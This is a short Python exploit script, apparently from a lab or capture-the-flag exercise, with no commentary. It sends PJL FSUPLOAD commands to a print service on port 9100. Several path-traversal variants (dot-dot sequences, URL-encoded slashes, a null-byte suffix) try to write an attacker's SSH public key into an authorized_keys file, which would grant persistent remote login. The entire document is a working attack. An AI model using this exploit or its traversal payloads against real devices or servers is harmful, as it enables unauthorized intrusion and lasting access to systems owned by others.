#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
n = len(KEY)

paths = [
    "../.ssh/authorized_keys",
    "....//....//.ssh/authorized_keys",
    "..%2f.ssh%2fauthorized_keys",
    "logs/../../.ssh/authorized_keys",
    "../.ssh/authorized_keys\x00.txt",
]

for path in paths:
    hdr = f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={n}\r\n'.encode()
    s = socket.socket()
    s.settimeout(4)
    s.connect(("127.0.0.1", 9100))
    s.sendall(hdr + KEY)
    try:
        r = s.recv(512)
    except socket.timeout:
        r = b"TIMEOUT"
    s.close()
    print(repr(path), repr(r[:80]))